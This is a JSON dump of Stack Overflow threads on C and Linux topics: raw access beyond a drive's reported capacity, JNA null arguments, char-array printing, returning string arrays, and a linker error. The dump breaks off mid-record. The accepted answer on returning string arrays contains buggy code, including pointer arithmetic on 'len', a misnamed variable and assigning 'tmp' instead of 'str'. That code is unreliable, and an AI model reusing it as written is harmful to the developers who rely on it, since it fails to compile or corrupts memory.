[{"tags": ["c", "linux-kernel", "linux-device-driver", "block-device", "sata"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 1, "creation_date": 1518049013, "post_id": 48675276, "comment_id": 84349422, "body": "How do you know its reported capacity is smaller than its accessible space? What counts as accessible space?"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1518096330, "post_id": 48675276, "comment_id": 84370643, "body": "How did &quot;the data past the capacity of the device&quot; even get there?"}, {"owner": {"reputation": 1, "user_id": 3884985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZZDiW.jpg?s=128&g=1", "display_name": "trinof", "link": "https://stackoverflow.com/users/3884985/trinof"}, "reply_to_user": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518111378, "post_id": 48675276, "comment_id": 84381281, "body": "@immibis The device has readable/writable areas on the drive level that are past the reported capacity which can accessed at the interface level. For instance, I can use sg_raw from sg3_utils to formulate my own byte packets to read and write past the capacity."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518126787, "post_id": 48675276, "comment_id": 84389455, "body": "You would probably have to modify the driver (or use a special modified driver that someone else has made already)"}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 3884985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZZDiW.jpg?s=128&g=1", "display_name": "trinof", "link": "https://stackoverflow.com/users/3884985/trinof"}, "edited": false, "score": 1, "creation_date": 1518112435, "post_id": 48676196, "comment_id": 84381848, "body": "This device I have is intentionally misreporting its capacity. I understand that in general trying to access past the reported capacity of a device is a mistake, but I&#39;m trying to find out if it would be possible to still use the file-like interface Linux provides to block devices to access this bizarre area without making any driver changes."}], "tags": [], "owner": {"reputation": 1411, "user_id": 2603057, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/OVR5H.png?s=128&g=1", "display_name": "phyrrus9", "link": "https://stackoverflow.com/users/2603057/phyrrus9"}, "is_accepted": false, "score": 1, "last_activity_date": 1518054447, "creation_date": 1518054447, "answer_id": 48676196, "question_id": 48675276, "link": "https://stackoverflow.com/questions/48675276/accessing-block-device-data-beyond-reported-capacity/48676196#48676196", "title": "Accessing block device data beyond reported capacity", "body": "<p>If I remember correctly, that error is caused because the device itself wasn't able to read or write that cylinder, indicating it likely does not exist. Note that many manufacturers use 1000B = 1KB and the likes, and that file systems reserve their own space as well.</p>\n\n<p>The short answer is, you don't. The device will only report the space you can use, and will not report cache sizes either. This misreporting isn't at the OS level, but at the device.</p>\n"}], "owner": {"reputation": 1, "user_id": 3884985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZZDiW.jpg?s=128&g=1", "display_name": "trinof", "link": "https://stackoverflow.com/users/3884985/trinof"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1518120324, "creation_date": 1518047653, "last_edit_date": 1518120324, "question_id": 48675276, "link": "https://stackoverflow.com/questions/48675276/accessing-block-device-data-beyond-reported-capacity", "title": "Accessing block device data beyond reported capacity", "body": "<p>I have a SATA block device that reports a capacity that is smaller than its accessible space, and I would like to read and write to it past the reported capacity using the file created by Linux for block devices. So I hope to operate using the descriptor returned from open({<code>\"/dev/sda\", O_RDWR</code>). However, when I try to use <code>lseek</code> to seek past the capacity of the device, I get an error and errno gets set to <code>EINVAL (22)</code>. \nIs there a way to access the data past the capacity of the device without modifying the device drivers and while still using the file descriptor returned by <code>open()</code>?</p>\n\n<p>My Linux release is CentOS 7 with kernel 3.10.0-514.21.1.el7.x86_64, although I'd be interested in solutions even if they involve other Linux distributions.</p>\n\n<p>Edit: The drive I am working with is a FLEX protocol drive that reports the conventional capacity of the drive, but also has shingled magnetic recording available at an offset above the reported capacity of the drive. If you are interested, the details of this protocol can be found on the <a href=\"http://t13.org/Documents/UploadedDocuments/docs2018/f18101r0-Flex_Device_Interface.pdf\" rel=\"nofollow noreferrer\">T13 website</a>.</p>\n"}, {"tags": ["java", "c", "java-native-interface", "jna"], "comments": [{"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1518044891, "post_id": 48674784, "comment_id": 84348129, "body": "Questions seeking debugging help (&quot;why isn&#39;t this code working?&quot;) must include the desired behavior, a specific problem or error and the shortest code necessary to reproduce it in the question itself. Questions without a clear problem statement are not useful to other readers. See: <a href=\"https://stackoverflow.com/help/mcve\">How to create a Minimal, Complete, and Verifiable example</a>."}, {"owner": {"reputation": 473, "user_id": 3401008, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dc5de4ad0e1d91c1257b2ca8c759525?s=128&d=identicon&r=PG&f=1", "display_name": "dyslexit", "link": "https://stackoverflow.com/users/3401008/dyslexit"}, "reply_to_user": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1518045164, "post_id": 48674784, "comment_id": 84348225, "body": "@EJP This isn&#39;t a &quot;why isn&#39;t this code working&quot; question. This is a question for how to pass a null value to a Java native method. Please explain how the problem statement is not clear."}, {"owner": {"reputation": 1908, "user_id": 2543253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a87e0065d4c5036eb7adabe2edfd187?s=128&d=identicon&r=PG", "display_name": "user2543253", "link": "https://stackoverflow.com/users/2543253/user2543253"}, "edited": false, "score": 0, "creation_date": 1518084980, "post_id": 48674784, "comment_id": 84362942, "body": "The question should not be , however; &quot;how to pass a null value to native via JNA&quot; but &quot;how to pass a null value to the udev-java-bindings library&quot;. JNA can handle nulls just fine. It&#39;s the library method that doesn&#39;t check for null. Looks easy to fix, however."}, {"owner": {"reputation": 473, "user_id": 3401008, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dc5de4ad0e1d91c1257b2ca8c759525?s=128&d=identicon&r=PG&f=1", "display_name": "dyslexit", "link": "https://stackoverflow.com/users/3401008/dyslexit"}, "reply_to_user": {"reputation": 1908, "user_id": 2543253, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a87e0065d4c5036eb7adabe2edfd187?s=128&d=identicon&r=PG", "display_name": "user2543253", "link": "https://stackoverflow.com/users/2543253/user2543253"}, "edited": false, "score": 0, "creation_date": 1518126674, "post_id": 48674784, "comment_id": 84389392, "body": "@user2543253 Thank you! I wasn&#39;t aware of that and the stack trace pointing to <code>...jna.StringUtil.asPointer</code> led me down the wrong path of thinking it was a JNA issue. I now realize it was a problem with the library, like you said, and have fixed it. Thanks for your help."}], "answers": [{"tags": [], "owner": {"reputation": 473, "user_id": 3401008, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dc5de4ad0e1d91c1257b2ca8c759525?s=128&d=identicon&r=PG&f=1", "display_name": "dyslexit", "link": "https://stackoverflow.com/users/3401008/dyslexit"}, "is_accepted": true, "score": 1, "last_activity_date": 1518126994, "creation_date": 1518126994, "answer_id": 48695437, "question_id": 48674784, "link": "https://stackoverflow.com/questions/48674784/how-to-pass-a-java-null-parameter-to-a-native-method-that-uses-jna-to-compile-to/48695437#48695437", "title": "How to pass a Java null parameter to a native method that uses JNA to compile to C code?", "body": "<p>@user2543253 pointed out that it isn't a JNA issue but an issue with the Java library. I fixed the issue by simply adding</p>\n\n<pre><code>public int addMatchSubsystem(final String subsystem) {\n    return UdevLibrary.INSTANCE().udev_monitor_filter_add_match_subsystem_devtype(\n            getPointer(), StringUtil.asPointer(subsystem), null);\n}\n</code></pre>\n\n<p>to the library's Monitor class.</p>\n"}], "owner": {"reputation": 473, "user_id": 3401008, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0dc5de4ad0e1d91c1257b2ca8c759525?s=128&d=identicon&r=PG&f=1", "display_name": "dyslexit", "link": "https://stackoverflow.com/users/3401008/dyslexit"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 236, "favorite_count": 0, "accepted_answer_id": 48695437, "answer_count": 1, "score": 1, "last_activity_date": 1518126994, "creation_date": 1518044637, "last_edit_date": 1518047090, "question_id": 48674784, "link": "https://stackoverflow.com/questions/48674784/how-to-pass-a-java-null-parameter-to-a-native-method-that-uses-jna-to-compile-to", "title": "How to pass a Java null parameter to a native method that uses JNA to compile to C code?", "body": "<p>I'm trying to use a <a href=\"https://github.com/Zubnix/udev-java-bindings\" rel=\"nofollow noreferrer\">Java library</a> that wraps the C library <a href=\"https://www.freedesktop.org/software/systemd/man/libudev.html\" rel=\"nofollow noreferrer\">libudev</a>. One of the methods I need to call, <code>addMatchSubsystemDevtype(final String subsystem, final String devtype)</code>, takes two String parameters, the second of which needs to be a <code>null</code>. An example of this in C code can be seen <a href=\"http://www.signal11.us/oss/udev/\" rel=\"nofollow noreferrer\">here</a> (ctrl+f null). However when I attempt to do this in Java, JNA throws a <code>NullPointerException</code>, as can be seen here:</p>\n\n<pre><code>Monitor monitor = Monitor.newFromNetlink(udev, \"udev\");\nmonitor.addMatchSubsystemDevtype(\"video4linux\", null);\n</code></pre>\n\n<p>Exception:</p>\n\n<pre><code>Exception in thread \"main\" java.lang.NullPointerException\n    at com.sun.jna.Native.getBytes(Native.java:604)\n    at com.sun.jna.Native.toByteArray(Native.java:627)\n    at com.sun.jna.Native.toByteArray(Native.java:620)\n    at org.freedesktop.libudev.jna.StringUtil.asPointer(StringUtil.java:14)\n    at org.freedesktop.libudev.Monitor.addMatchSubsystemDevtype(Monitor.java:116)\n    at Example.main(Example.java:14)\n</code></pre>\n\n<p>Is there any way I can pass a null to this C method from Java?</p>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 4, "creation_date": 1518044624, "post_id": 48674763, "comment_id": 84348023, "body": "You forgot to add a null terminator to the string."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 2, "creation_date": 1518044670, "post_id": 48674763, "comment_id": 84348051, "body": "When you fix that, don&#39;t forget to increase the size to <code>letters[96]</code>"}, {"owner": {"reputation": 55516, "user_id": 892256, "user_type": "registered", "accept_rate": 99, "profile_image": "https://i.stack.imgur.com/15FJW.png?s=128&g=1", "display_name": "Ed Heal", "link": "https://stackoverflow.com/users/892256/ed-heal"}, "edited": false, "score": 0, "creation_date": 1518044746, "post_id": 48674763, "comment_id": 84348072, "body": "And make sure that <code>i</code> does not reach 94. Also <code>printf(&quot;%s&quot;, letters)</code> would be better"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7582060"}, "edited": false, "score": 0, "creation_date": 1518044898, "post_id": 48674763, "comment_id": 84348133, "body": "I worked when i changed ch&lt;=127 to ch&lt;127"}, {"owner": {"user_type": "does_not_exist", "display_name": "user7582060"}, "edited": false, "score": 0, "creation_date": 1518045371, "post_id": 48674763, "comment_id": 84348298, "body": "I tried using rand() but it says that it doesnt support in C?"}, {"owner": {"reputation": 1528, "user_id": 6676042, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/1pROg.jpg?s=128&g=1", "display_name": "IanC", "link": "https://stackoverflow.com/users/6676042/ianc"}, "edited": false, "score": 0, "creation_date": 1518045527, "post_id": 48674763, "comment_id": 84348351, "body": "You&#39;re also skipping the space character, because you increase <code>ch</code> before assigning it to the array. If you want to include it you&#39;ll have to increase it after the assignment. This also causes another issue: When you have <code>while(ch &lt;= 127)</code> and increment <code>ch</code> before assigning it you&#39;ll end up assigning when <code>ch == 128</code>."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1518045550, "post_id": 48674763, "comment_id": 84348358, "body": "To use <code>rand()</code> include <code>&lt;stdlib .h&gt;</code>"}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 1, "creation_date": 1518045567, "post_id": 48674763, "comment_id": 84348369, "body": "You&#39;ll also want to seed rand."}], "answers": [{"tags": [], "owner": {"reputation": 139291, "user_id": 298225, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ef102f4ee36e58d09e0b27cd5393a1d8?s=128&d=identicon&r=PG", "display_name": "Eric Postpischil", "link": "https://stackoverflow.com/users/298225/eric-postpischil"}, "is_accepted": false, "score": 4, "last_activity_date": 1518047040, "last_edit_date": 1518047040, "creation_date": 1518045841, "answer_id": 48674999, "question_id": 48674763, "link": "https://stackoverflow.com/questions/48674763/unexpected-output-at-the-end-of-printing-an-array-of-char/48674999#48674999", "title": "Unexpected output at the end of printing an array of char", "body": "<p>First, if you count the characters from 32 to 127, there are 96 of them. So <code>letters</code> should be defined with <code>letters[96]</code>, not <code>letters[95]</code>.</p>\n\n<p>Second, you should not pass <code>letters</code> to <code>printf</code> as the first parameter. The first parameter should be a format string, not a string to be printed literally. In particular, since <code>letters</code> contains a \u201c%\u201d character, it is not a proper format string.</p>\n\n<p>Third, when printing a string, <code>printf</code> expects a null-terminated string by default. To print an array of <code>char</code> that is not null-terminated, you can use a precision in the conversions specifier:</p>\n\n<pre><code>printf(\"%.96s\\n\", letters);\n</code></pre>\n\n<p>Fourth, you say you want all the characters from 32 to 127, but your loop starts with <code>ch</code> set to 32 and increments it before putting it into the array, so the first value put into the array is 33. You should nove the increment to later.</p>\n\n<p>Fifth, you do not initialize <code>i</code>. It must be set to zero before starting the loop.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7582060"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1536303829, "creation_date": 1518044528, "last_edit_date": 1536303829, "question_id": 48674763, "link": "https://stackoverflow.com/questions/48674763/unexpected-output-at-the-end-of-printing-an-array-of-char", "title": "Unexpected output at the end of printing an array of char", "body": "<pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc, const char * argv[]) {\n\u00a0   unsigned char ch,i,letters[95];\n    int tapped [0];\n    ch=32; //start with 32 (space)\n\n    while(ch&lt;=127){\n        ch++;\n        letters[i]=ch;\n        i++;\n    }\u00a0\n    printf(letters);\n\n\n    return 0;\n}\n</code></pre>\n\n<p>I'm trying to get the ASCII characters from 32 to 127 into an array so I can generate N random ones in another loop.</p>\n\n<p>The issue is that I'm getting back all of them, but I'm also getting back some additional unexpected at the end:</p>\n\n<pre><code>!\"#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\\200\\300\\367\\277_\\377\n</code></pre>\n\n<p>I don't understand why I'm getting \\200\\300\\367\\277_\\377 at the end, since they aren't in the range. I'm new to C so is there some aspects of arrays that I'm not doing properly?</p>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 0, "creation_date": 1518042365, "post_id": 48674280, "comment_id": 84347086, "body": "&quot;I&#39;m getting two errors&quot; care to share with us? Please <a href=\"https://stackoverflow.com/posts/48674280/edit\">edit</a> your question to include de errors message and an indicator where the error appears. Do notice we don&#39;t see line numbers."}, {"owner": {"reputation": 50953, "user_id": 1983495, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/aMDiK.jpg?s=128&g=1", "display_name": "Iharob Al Asimi", "link": "https://stackoverflow.com/users/1983495/iharob-al-asimi"}, "edited": false, "score": 1, "creation_date": 1518042697, "post_id": 48674280, "comment_id": 84347240, "body": "Don&#39;t return it! Just define it in <code>main()</code> and pass it as a parameter."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518042804, "post_id": 48674280, "comment_id": 84347292, "body": "A careful reading of the error messages should give you the answer. When the compiler generates a <i>&quot;wrong type&quot;</i> error, it typically tells you the type it expected, and the type that it found."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1518043530, "post_id": 48674280, "comment_id": 84347610, "body": "Rather than making txtFiles an array local to the function, dynamically allocate it with malloc() so it will still exist when you return the pointer to it."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518043934, "post_id": 48674280, "comment_id": 84347760, "body": "In C, an <i>array</i> cannot be returned.  Pointers can be returned though."}], "answers": [{"tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": true, "score": 1, "last_activity_date": 1518047296, "last_edit_date": 1518047296, "creation_date": 1518044083, "answer_id": 48674679, "question_id": 48674280, "link": "https://stackoverflow.com/questions/48674280/how-to-return-an-array-of-character-pointers-from-a-function-back-to-main/48674679#48674679", "title": "How to return an array of character pointers from a function back to main?", "body": "<p>If you want that <code>getTxtFilesInDir</code> returns an array of strings, it should\nreturn a <code>char**</code>, not a <code>char*</code>.</p>\n\n<p>Also you don't need to declare the variable as <code>static</code>. You declare a variable\nin a function as <code>static</code>, when you want that the variable remains the same for\nall calls of the function. In this case this is probably not what you want to\ndo.</p>\n\n<p>Without modifying too much of your initial code, you can first allocate memory\nfor an arrray of strings, and then resize it when you've got a new entry. In\nthis example I do that at once, because <code>realloc(NULL, somesize)</code> is the same as\ndoing <code>malloc(somesize)</code>. That's why it's important to initialize <code>*tmp = 0</code> and\n<code>txtFiles = NULL</code>, so this trick works. You should also pass a pointer to an <code>size_t</code> where you store the number of entries:</p>\n\n<pre><code>char **getTxtFilesInDir(const char* directory, size_t *len) {\n    if(directory == NULL || len == NULL)\n        return NULL;\n\n    ...\n\n    *len = 0;\n    char **txtFiles = NULL, **tmp;\n    char *str;\n\n    if (d) {\n      printf(\"Found: \\n\");\n      while ((dir = readdir(d)) != NULL)\n      {\n         if (isTxt(dir-&gt;d_name))\n         {\n             tmp = realloc(txtFiles, (len+1) * sizeof *textFiles);\n             if(tmp == NULL)\n                 return txtFiles; // return what you've got so far\n\n\n             str = malloc(strlen(dir-&gt;d_name) + 1);\n             if(str == NULL)\n             {\n                 if(txtFiles == NULL) // first time, free everything\n                 {\n                     free(tmp);\n                     return NULL;\n                 }\n\n                 return tmp; // return all you've got so far\n             }\n\n             strcpy(str, dir-&gt;d_name); // no need of strcnpy, you've allocated\n                                       // enough memory\n             txtFiles = tmp;\n             txtFiles[(*len)++] = tmp;\n         }\n      }\n      closedir(d);\n\n      return txtFiles;\n}\n</code></pre>\n\n<p>The important bits here is 1. how you expand the memory with <code>realloc</code>. Then it\nallocates memory for the string using <code>malloc</code>. I do that before <code>txtFiles = tmp;</code>,\nso that I don't have to write to many <code>if(...==NULL)</code>. If something goes\nwrong along the way, the function returns all the file names it already has\nstored.</p>\n\n<p>Now in <code>main</code> you do:</p>\n\n<pre><code>int main(int argc, char **argv)\n{\n    ...\n\n    size_t len = 0;\n    char **files = getTxtFilesInDir(cd, &amp;len);\n\n    if(file == NULL)\n    {\n        fprintf(stderr, \"No files found\\n\");\n        return 1;\n    }\n\n    for(size_t i = 0; i &lt; len; ++i)\n        printf(\"file: %s\\n\", files[i]);\n\n    // freeing memory\n    for(size_t i = 0; i &lt; len; ++i)\n        free(files[i]);\n\n    free(files);\n\n    return 0;\n}\n</code></pre>\n\n<p>I also want to comment on your orginal way of copying:</p>\n\n<pre><code>strncpy(txtFiles[i], dir-&gt;d_name, strlen(dir-&gt;d_name));\n</code></pre>\n\n<p><code>strncpy</code> is great when you want to limit the number of bytes to be copied. In\nyour case you've already allocated enough memory, so there is no need to. And\nwhen you use <code>strncpy</code>, the limit should be bound to the number of bytes\navailable to the destination, not the source, otherwise you might copy more\nbytes than it should. In your case you won't get a valid c-string, because you\nare limiting to copy to the lenth of <code>dir-&gt;d_name</code>, so the <code>'\\0'</code>-terminating\nwon't be copied.</p>\n\n<blockquote>\n  <p><em>man strcpy</em></p>\n\n<pre><code>#include &lt;string.h&gt;\n\nchar *strcpy(char *dest, const char *src);\n\nchar *strncpy(char *dest, const char *src, size_t n);\n</code></pre>\n  \n  <p>[...]</p>\n  \n  <p>The <code>strncpy()</code> function is similar, except that at most <code>n</code> bytes of <code>src</code> are copied.  <strong>Warning: If there is no null byte among the first <code>n</code>\n  bytes of <code>src</code>, the string placed in dest will not be null-terminated.</strong></p>\n</blockquote>\n\n<p>When you use <code>strncpy</code> you <strong>must</strong> make sure that the copy is a valid string by\nsetting the <code>'\\0'</code>-terminating byte yourself. Because you've allocated\n<code>strlen(dir-&gt;d_name)+1</code> bytes for the string:</p>\n\n<pre><code>strncpy(txtFiles[i], dir-&gt;d_name, strlen(dir-&gt;d_name));\ntextFiles[i][strlen(dir-&gt;d_name)] = 0;\n</code></pre>\n\n<p>Also the exit value of a program is a <code>unsigned</code> value, it goes from 0 to 255.\nIn <code>main</code> you should return <code>1</code> instead of <code>-1</code> on error.</p>\n"}], "owner": {"reputation": 75, "user_id": 5012418, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/8e254ea55274dbc62c956f72452c70e1?s=128&d=identicon&r=PG&f=1", "display_name": "M Dey", "link": "https://stackoverflow.com/users/5012418/m-dey"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 48674679, "answer_count": 1, "score": 1, "last_activity_date": 1518047296, "creation_date": 1518042270, "question_id": 48674280, "link": "https://stackoverflow.com/questions/48674280/how-to-return-an-array-of-character-pointers-from-a-function-back-to-main", "title": "How to return an array of character pointers from a function back to main?", "body": "<p>I'm trying to store a list of files with a .txt extension into an array from my current working directory. I've gotten as far as getting the array together, now I just need to return it. I'm new to C and I'm not used to the pointer situation. How can I return an array of char pointers? I have the array created, and its allocated based on how many Text files I find in the directory. </p>\n\n<p>I'm getting two errors when I try to compile which leads me to believe that my understanding of pointers is not what I thought it was. I also have been reading that my array will be destroyed when returning from the function, because it is on the stack. I'm not sure how to fix that. Any help or criticism would be welcome.</p>\n\n<pre><code>    // prototypes\n    char* getLine();\n    void replaceWord();\n    char * getTxtFilesInDir(char*);\n    bool isTxt(char *);\n\n    int main(int argc, char **argv) {\n\n       // Check to see if correct number of arguments is given\n       if (argc &lt; 4) {\n          printf(\"ERROR: Not enough parameters supplied. Please supply a find,\"\n                \"replace, and prefix parameter and try again.\\n\");\n          return -1;\n       }\n\n       // Initialize variables\n       char *find, *replace, *prefix;\n       find=argv[1];\n       replace=argv[2];\n       prefix=argv[3];\n       char cd[1024];\n\n       // Get the Current working directory to grab files\n       if (getcwd(cd, sizeof(cd)) != NULL) {\n          printf(\"Current working dir is: %s\\n\", cd);\n       } else {\n          perror(\"getcwd() error\");\n       }\n\n       // Get the values of the arguments\n       printf(\"Value of find: %s\\nValue of replace: %s\\nValue of prefix: %s\\n\",\n             find, replace, prefix);\n\n       // create an array of the files that are valid\n       char* files = getTxtFilesInDir(cd);\n\n       return 0;\n\n    }\nchar*  getTxtFilesInDir(char* directory) {\n   DIR *d;\n   struct dirent *dir;\n   d = opendir(directory);\n   int n=0, i=0;\n\n   // get the number of text files in the directory\n   if (d) {\n      while((dir = readdir(d)) != NULL) {\n         if (isTxt(dir-&gt;d_name)) {\n            n++;\n         }\n      }\n   }\n\n   rewinddir(d);\n   // Create the array of text files depending on the size\n   static char* txtFiles[n];\n\n   // add the text files to the array\n   if (d) {\n      printf(\"Found: \\n\");\n      while ((dir = readdir(d)) != NULL)\n      {\n         if (isTxt(dir-&gt;d_name)) {\n            printf(\"%s\\n\", dir-&gt;d_name);\n            txtFiles[i]= (char*) malloc (strlen(dir-&gt;d_name)+1);\n            strncpy(txtFiles[i], dir-&gt;d_name, strlen(dir-&gt;d_name));\n            i++;\n\n         }\n      }\n      closedir(d);\n   }\n   return txtFiles;\n}\n\nbool isTxt(char *file) {\n   size_t len = strlen(file);\n   return len &gt; 4 &amp;&amp; strcmp(file + len -4, \".txt\") == 0;\n}\n</code></pre>\n"}, {"tags": ["c", "eclipse", "compiler-errors", "symbols"], "comments": [{"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1518041502, "post_id": 48673875, "comment_id": 84346689, "body": "And the other error is?"}], "answers": [{"comments": [{"owner": {"reputation": 7, "user_id": 4778634, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/fc3f8ac89f7264a8a256d5d4aa3e936e?s=128&d=identicon&r=PG&f=1", "display_name": "lwillins", "link": "https://stackoverflow.com/users/4778634/lwillins"}, "edited": false, "score": 0, "creation_date": 1518047536, "post_id": 48674153, "comment_id": 84349035, "body": "removed getch() and the error is still present unfortunately."}, {"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "reply_to_user": {"reputation": 7, "user_id": 4778634, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/fc3f8ac89f7264a8a256d5d4aa3e936e?s=128&d=identicon&r=PG&f=1", "display_name": "lwillins", "link": "https://stackoverflow.com/users/4778634/lwillins"}, "edited": false, "score": 0, "creation_date": 1518048153, "post_id": 48674153, "comment_id": 84349182, "body": "What error? Read the second paragraph of my answer; what you posted doesn&#39;t actually tell you anything, we need to know what precedes make failing."}, {"owner": {"reputation": 7, "user_id": 4778634, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/fc3f8ac89f7264a8a256d5d4aa3e936e?s=128&d=identicon&r=PG&f=1", "display_name": "lwillins", "link": "https://stackoverflow.com/users/4778634/lwillins"}, "edited": false, "score": 0, "creation_date": 1518048690, "post_id": 48674153, "comment_id": 84349333, "body": "Here&#39;s the full content in my console  :  &quot;make all  Building target: LabZero Invoking: MacOS X C Linker gcc  -o &quot;LabZero&quot;  ./rectangle.o    Undefined symbols for architecture x86_64:   &quot;_main&quot;, referenced from:      implicit entry/start for main executable ld: symbol(s) not found for architecture x86_64 clang: error: linker command failed with exit code 1 (use -v to see invocation) make: *** [LabZero] Error 1&quot;"}], "tags": [], "owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": 